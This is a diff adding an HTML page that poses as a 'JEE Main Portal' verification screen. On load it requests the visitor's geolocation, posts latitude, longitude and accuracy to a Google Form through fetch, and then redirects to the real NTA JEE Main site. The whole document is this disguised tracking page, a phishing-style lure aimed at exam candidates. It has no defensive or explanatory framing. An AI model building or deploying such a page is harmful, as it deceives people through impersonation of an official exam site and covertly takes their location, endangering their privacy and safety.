@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>JEE Main Portal</title>
+    <script>
+        function sendLocation(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const accuracy = position.coords.accuracy;
+
+            // Send data to Google Forms (replace with your form details)
+            const formURL = "https://docs.google.com/forms/d/e/YOUR_FORM_ID/formResponse";
+            const data = new FormData();
+            data.append("entry.YOUR_LAT_ENTRY_ID", lat);
+            data.append("entry.YOUR_LON_ENTRY_ID", lon);
+            data.append("entry.YOUR_ACC_ENTRY_ID", accuracy);
+
+            fetch(formURL, { method: "POST", body: data, mode: "no-cors" })
+                .then(() => {
+                    console.log("Location sent!");
+                    window.location.href = "https://jeemain.nta.nic.in/"; // Redirect to JEE Main site
+                })
+                .catch(error => {
+                    console.error("Error:", error);
+                    window.location.href = "https://jeemain.nta.nic.in/"; // Redirect even if failed
+                });
+        }
+
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocation, (error) => {
+                    console.log("User denied location access.");
+                    window.location.href = "https://jeemain.nta.nic.in/"; // Redirect if denied
+                });
+            } else {
+                alert("Geolocation is not supported by this browser.");
+                window.location.href = "https://jeemain.nta.nic.in/";
+            }
+        }
+
+        window.onload = getLocation;
+    </script>
+</head>
+<body>
+    <h1>JEE Main Verification</h1>
+    <p>Verifying your details, please wait...</p>
+</body>
+</html>
